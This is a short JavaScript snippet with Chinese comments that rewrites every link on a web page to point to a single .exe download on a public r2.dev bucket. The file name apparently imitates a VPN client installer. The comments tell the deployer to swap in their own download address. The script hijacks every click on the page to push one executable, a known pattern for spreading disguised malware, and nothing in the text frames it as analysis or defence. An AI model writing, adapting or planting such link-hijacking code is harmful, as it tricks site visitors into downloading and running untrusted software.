 

var xz = "https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe";

//可以把   https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe 这个改成下载地址；https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe
//可以把   https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe 这个改成文件下载：https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe


var links = document.getElementsByTagName("a");
for (var i = 0; i < links.length; i++) {
    if (links[i].hasAttribute("href")) {
        links[i].href = xz;
    }
} 
